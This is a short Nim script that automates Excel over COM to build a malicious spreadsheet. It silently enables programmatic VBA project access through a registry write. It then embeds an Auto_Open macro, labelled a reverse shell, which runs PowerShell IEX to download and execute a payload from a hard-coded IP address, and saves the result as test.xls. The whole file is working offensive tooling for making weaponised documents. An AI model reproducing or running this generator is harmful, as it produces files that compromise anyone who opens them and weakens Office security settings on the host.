import winim/com
import strformat

var objExcel = CreateObject("Excel.Application")
objExcel.Visible= false
var WshShell = CreateObject("WScript.Shell")
var Application_Version = objExcel.Version

var strRegPath = fmt"HKEY_CURRENT_USER\Software\Microsoft\Office\{Application_Version}\Excel\Security\AccessVBOM"
WshShell.RegWrite(strRegPath, 1, "REG_DWORD")
var objWorkbook = objExcel.Workbooks.Add()
var xlmodule = objWorkbook.VBProject.VBComponents.Add(1)
var strMacroRevShell = """Sub Auto_Open()
Call Shell(""cmd.exe /c powershell.exe IEX(IWR -uri 'http://192.168.1.75:443/getit.txt')"", 1)
End Sub"""
xlmodule.CodeModule.AddFromString(strMacroRevShell)
objWorkbook.SaveAs("test.xls")
objExcel.DisplayAlerts = false
objWorkbook.Close(false)
    

